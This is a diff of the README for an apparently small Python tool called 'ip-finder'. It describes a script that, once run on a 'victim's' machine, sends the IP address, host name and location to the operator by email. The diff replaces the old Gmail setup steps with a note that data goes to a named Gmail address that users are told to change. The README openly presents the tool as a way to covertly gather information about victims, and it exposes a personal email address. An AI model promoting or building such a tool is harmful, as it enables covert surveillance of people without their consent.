@@ -1,7 +1,9 @@
 # ip-finder
 Simple python file that sends victim ip,host name,location etc.., to your mail address
 
-First create new gmail because you need to ON less secure apps by using this link https://myaccount.google.com/lesssecureapps?pli=1.
+If you run this file on your victims machine this python file sent victims detail to the mail address-'gowtham758550@gmail.com' so you need to change the reciver address.
 
-Use that created mail id for sender mail id and give the password.
+Thankyou😁
+
+
 
